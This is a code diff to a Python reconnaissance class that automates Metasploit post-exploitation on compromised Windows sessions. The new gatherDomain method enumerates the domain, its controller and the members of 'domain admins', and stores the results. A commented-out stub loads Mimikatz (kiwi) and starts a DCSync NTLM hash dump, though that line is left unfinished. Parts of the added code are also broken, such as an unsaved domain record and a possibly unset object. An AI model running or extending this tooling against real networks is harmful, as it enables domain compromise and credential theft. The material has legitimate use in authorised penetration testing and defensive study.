@@ -2,6 +2,8 @@
 from data.recon import Recon
 from data.recon import ReconFiles
 from data.recon import ReconPrograms
+from data.recon import ReconDomain
+from data.recon import ReconDomainUsers
 from data.session import Session
 import re
 import time
@@ -82,7 +84,10 @@ class Reconnaissance():
                     recon._id = sessionInput
                     session.recon_id.append(recon.session_id)
                     for lines in whoami.splitlines():
-                        recon.whoami = lines
+                        if lines == '':
+                            pass
+                        else:
+                            recon.whoami = lines
             recon.save()
             session.save()
         except Exception as msg:
@@ -230,6 +235,62 @@ class Reconnaissance():
                 pid_mapped = dict(zip(desc_pid, temp_list))
                 pid_list.append(pid_mapped)
         return pid_list
+
+    def gatherDomain(self, msfclient, sessionInput):
+        domain = ""
+        user_list = {'User': 'user', 'IP': '0.0.0.0'}
+        domain_user = []
+        post = msfclient.client.modules.use('post', 'windows/gather/enum_domain')
+        post['SESSION'] = sessionInput
+        cid = msfclient.client.consoles.console().cid
+        run_enum_domain = msfclient.client.consoles.console(cid).run_module_with_output(post)
+        for line in run_enum_domain.splitlines():
+            if '[-]' in line:
+                print("[-] Issue gathering domain info!")
+            else:
+                if line.find("Domain: ") != -1:
+                    domain = line.split("Domain: ",1)[1]
+                elif line.find("Controller: ") != -1:
+                    domain_user_info = line.split("Controller: ", 1)[1].split()
+                    user_list['User'] = domain_user_info[0].upper()
+                    user_list['IP'] = domain_user_info[2].replace(')', '')
+                else:
+                    print("[-] Issue gathering domain info!")
+        post = msfclient.client.modules.use('post', 'windows/gather/enum_domain_group_users')
+        post['GROUP'] = 'domain admins'
+        post['SESSION'] = sessionInput
+        run_enum_domain_group_users = msfclient.consoles.console(cid).run_module_with_output(post)
+        for line in run_enum_domain_group_users.splitlines():
+            if domain in line:
+                users = line.split('\\')[1]
+                if 'not' in users:
+                    pass
+                else:
+                    domain_user.append(users)
+        session = Session.objects(_id=sessionInput).first()
+        if session:
+            recon = Recon.objects(_id=sessionInput).first()
+            if recon is None:
+                recon = Recon()
+                recon_domain = ReconDomain()
+                recon_domain.domain = domain
+                recon_domain.domain_controller = user_list
+                recon_domain.domain_user = domain_user
+        recon.save()
+
+                    
+
+
+
+
+        # def gatherCreds(self, msfclient, sessionInput):
+        #     hash_list = []
+        #     desc_has = ['NTLM Hash', 'LM Hash']
+        #     session = Session.objects(_id=sessionInput).first()
+        #     user = session.desc
+        #     run_kiwi = msfclient.sessions.session(sessionInput).run_with_output('load kiwi')
+        #     time.sleep(3)
+        #     run_dcsync = msfclient.sessions.session(sessionInput).run_with_output('dcsync_ntlm ' + )
 
 
     def parseProgramList(self, p):
